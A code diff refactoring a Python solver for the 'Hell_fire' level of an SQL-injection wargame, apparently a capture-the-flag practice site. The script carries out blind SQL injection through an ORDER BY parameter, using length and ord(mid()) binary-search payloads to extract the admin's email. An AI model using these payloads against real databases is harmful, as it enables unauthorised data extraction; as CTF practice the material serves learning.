@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
-    '''
+    """
     check string in response of request
     args[0]: response
-    '''
+    """
     return args[0].index('admin') < args[0].index('rubiya')
 
 
 def main():
-    '''
+    """
     Hell_fire 23
 
     if(preg_match('/prob|_|\.|proc|union/i', $_GET[order])) exit("No Hack ~_~");
@@ -28,36 +29,25 @@ def main():
     $query = "select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
     if(($result['email']) && ($result['email'] === $_GET['email'])) solve("hell_fire");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
-    max_key_len = 32
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'order'
 
     payload = "id='admin' and length(email)>%s desc"
-    param = dict(order=payload)
-    len_of_key = los.find_key_len(url, param, check_func, cook)
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    len_of_key = p.find_key_len(check_func)
 
-    print(len_of_key)
+    p.payload = f"id='admin' and ord(mid(email,%d,1))<%s desc"
+    result = p.find_binary(check_func, len_of_key)
 
-    result = ''
-    num_of_requests = 0
-    for i in range(1, len_of_key + 1):
-        payload = f"id='admin' and ord(mid(email,{i},1))<%s desc"
-        param = dict(order=payload)
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             32, 127, cook)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
-
-    print('num_of_requests:', num_of_requests)
-
-    param = dict(email=result)
-    response = los.get_request(url, param, cook)
-
+    p.inj_param = 'email'
+    p.payload = result
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Hell_fire Clear!')
+        print('\nHell_fire Clear!')
 
 
 if __name__ == '__main__':
